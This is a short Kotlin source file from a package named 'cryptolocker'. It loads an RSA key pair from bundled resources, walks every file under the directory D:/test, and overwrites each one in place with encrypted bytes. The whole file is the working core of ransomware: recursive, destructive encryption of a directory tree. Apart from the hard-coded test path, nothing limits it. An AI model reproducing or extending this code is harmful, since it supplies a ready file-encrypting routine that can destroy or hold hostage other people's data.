package cc.flavien.cryptolocker

import java.io.File
import java.lang.Exception
import java.security.InvalidKeyException

fun main(args: Array<String>) {
    //EncryptMessage().savePair()
    val publicKey = EncryptMessage.getPublic(object {}.javaClass.classLoader
            .getResource("public_key").readBytes())
    val privateKey = EncryptMessage.getPrivate(object {}.javaClass.classLoader
            .getResource("private_key").readBytes())
    val cryptMessage = EncryptMessage(publicKey, privateKey)

    File("D:/test").walk().forEach {
        try {
            val encryptedFile = it.readBytes()
            it.writeBytes(cryptMessage.encrypt(encryptedFile))
            println(it)
        } catch (e: InvalidKeyException) {
            e.printStackTrace()
        } catch (e: Exception) {
            println("""file $it doesn't encrypted""")
        }
    }
}
